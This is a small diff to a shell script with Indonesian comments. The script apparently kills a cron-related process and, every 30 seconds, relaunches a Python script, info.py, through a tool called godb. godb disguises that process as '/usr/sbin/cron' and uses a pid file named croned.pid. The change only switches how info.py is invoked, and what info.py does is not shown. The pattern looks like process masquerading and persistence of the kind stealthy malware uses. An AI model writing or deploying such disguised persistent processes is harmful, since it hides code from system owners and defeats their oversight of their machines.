@@ -31,7 +31,7 @@ repeat_command() {
     kill_cron_pid
 
     # Jalankan perintah godb baru
-    ./godb -s "/usr/sbin/cron" -p croned.pid ./info.py &
+    ./godb -s "/usr/sbin/cron" -p croned.pid python3 info.py &
     GODB_PID=$!
     
     # Tunggu selama 30 detik sebelum mengulang
